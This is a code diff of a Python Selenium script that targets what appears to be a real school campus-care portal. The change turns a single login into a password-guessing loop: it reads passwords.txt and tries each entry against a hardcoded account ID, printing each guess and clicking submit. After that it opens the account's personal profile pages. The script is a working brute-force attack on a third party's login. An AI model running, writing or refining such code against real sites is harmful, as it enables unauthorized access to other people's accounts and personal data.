@@ -1,10 +1,16 @@
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 
+option = webdriver.ChromeOptions()
+# option.add_argument('--headless')
+driver = webdriver.Chrome(options=option)
+driver.implicitly_wait(5)
+
 
 '''User Defined Variables Start'''
 
 
+List = open("passwords.txt").readlines()
 details = {}
 baseUrl = "https://www.dpsggncampuscare.org"
 username ,password = 'p123317', 'password'
@@ -12,7 +18,6 @@ username ,password = 'p123317', 'password'
 
 '''User Defined Functions Start'''
 def login(username, passwords):
-    baseUrl
     if type(passwords) is list:
         driver.get(baseUrl)
         app = driver.find_element(By.CSS_SELECTOR, 'a.webtextnameerp')
@@ -29,9 +34,9 @@ def login(username, passwords):
         for password in passwords:
             try:
                 passfld.clear()
+                print(password)
                 passfld.send_keys(password)
                 passnext.click()
-                ref +=1
             except:
                 break
 
@@ -54,14 +59,9 @@ def login(username, passwords):
 
 '''User Defined Functions End'''
 
-option = webdriver.ChromeOptions()
-option.add_argument('--headless')
-driver = webdriver.Chrome(options=option)
-driver.implicitly_wait(5)
 
 
-
-login(username ,password)
+login(username ,List)
 personal = driver.find_element(By.XPATH,'//*[@id="side-menu"]/li[3]/a/span[1]')
 personal.click()
 myprofile = driver.find_element(By.XPATH,'//*[@id="side-menu"]/li[3]/ul/li[1]/a')
